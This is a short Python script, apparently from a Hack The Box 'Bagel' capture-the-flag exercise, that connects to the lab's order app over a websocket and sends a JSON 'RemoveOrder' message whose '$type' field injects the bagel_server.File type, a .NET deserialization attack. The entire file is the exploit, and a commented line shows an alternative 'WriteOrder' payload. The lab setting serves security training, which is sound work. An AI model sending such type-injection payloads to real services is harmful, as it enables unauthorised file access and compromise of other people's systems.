import websocket,json

ws = websocket.WebSocket()
ws.connect("ws://bagel.htb:5000/") # connect to order app
order = {"RemoveOrder": {"$type": "bagel_server.File, bagel"}}
# order = {"WriteOrder":"tes"}
data = str(json.dumps(order))
ws.send(data)
result = ws.recv()
print(result)